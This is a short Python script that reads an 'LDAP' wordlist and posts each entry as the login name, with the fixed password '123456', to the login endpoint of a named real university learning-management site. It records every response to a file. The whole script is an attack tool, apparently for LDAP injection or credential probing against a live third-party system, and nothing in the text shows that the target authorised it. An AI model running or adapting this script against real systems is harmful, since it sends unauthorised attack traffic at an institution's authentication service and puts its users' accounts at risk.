# !/usr/bin/python3
import requests
import sys

sys.stdout = open('./output/LDAP_1.txt', 'w', encoding='utf-8')

fields = []

url = "https://ieilms.jbnu.ac.kr/login/authLoginProc.jsp"

f = open("./dic/LDAP.txt", "r")
wordl = f.read().split("\n")
f.close()

for i in wordl:
    r = requests.post(url, data = {'login':str(i), 'passwd':'123456'})
    print(i, r.status_code)
    print(r.text+"\n")

    fields.append(r.text)
    